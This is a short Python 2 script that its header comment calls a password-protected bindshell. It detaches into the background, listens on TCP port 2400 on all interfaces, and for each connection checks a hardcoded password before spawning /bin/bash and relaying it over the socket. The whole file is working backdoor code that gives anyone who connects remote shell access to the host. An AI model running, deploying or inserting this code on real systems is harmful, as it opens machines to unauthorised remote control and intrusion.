#!/usr/bin/env python
# A Python Bindshell, with a "password'
import md5,os,sys,select
from pty import spawn, fork
from socket import *

if os.fork(): sys.exit(0)

try:
    watch = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
    port  = 2400
    die   = False
#    watch.set_reuse_addr()
    watch.bind(("",port))
    watch.listen(5)
except:
    print "[%d] unable to create socket" % os.getpid()
else:
    print "[%d] bindshell on port %d" % (os.getpid(),port)

while True:
    sock, remote = watch.accept()
    if os.fork(): continue
    pid, childID = fork()

    if pid == 0:
        if (raw_input("password? ")) == "mtso":
            spawn( "/bin/bash")
    else:
        b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK)
        c = os.fdopen(childID,'r+');  data = "";
        x = {b:c,c:b}

        while True:
            for f in select.select([b,c],[],[])[0]:
                try: d = os.read(f.fileno(),4096)
                except: sys.exit(0)
                if f is c and d.strip()==data:
                    data= ""; continue
                x[f].write(d)
                x[f].flush()
                data = d.strip()

    sock.close()
